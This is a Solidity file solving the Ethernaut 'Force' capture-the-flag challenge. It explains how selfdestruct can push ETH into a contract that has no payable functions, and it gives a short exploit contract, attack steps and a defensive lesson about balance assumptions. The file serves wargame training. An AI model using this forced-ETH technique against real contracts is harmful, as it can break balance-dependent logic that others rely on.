// Ethernaut Challenge #7: Force
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * FORCE CHALLENGE
 * 
 * Goal: Make the balance of the Force contract greater than 0.
 * 
 * The contract is empty with no payable functions or receive/fallback.
 * 
 * THE VULNERABILITY:
 * A contract with no payable functions can still receive ETH via:
 * 1. SELFDESTRUCT (selfdestruct) - a contract that selfdestructs sends its balance to a target
 * 2. Coinbase reward (mining directly to the address)
 * 3. Pre-funding the address before deployment (same address on different chain)
 * 
 * This exploits the fact that balance tracking is independent of code execution.
 * Even a contract with no code can have a non-zero balance.
 * 
 * EXPLOIT CONTRACT:
 */

contract ForceExploit {
    // Deploy with some ETH, then call destroy()
    function destroy(address payable target) external {
        selfdestruct(target); // Forces ETH to target regardless of their code
    }
    
    // Allow receiving ETH during deployment
    constructor() payable {}
}

/*
 * ATTACK STEPS:
 * 1. Deploy ForceExploit with some ETH (e.g., 1 wei): new ForceExploit{value: 1}()
 * 2. Call destroy(target) where target is the Force contract address
 * 3. Force contract now has balance > 0
 * 
 * LESSON: Never assume a contract's balance is 0 based on its code.
 * Balance checks should always be explicit and defensive.
 */
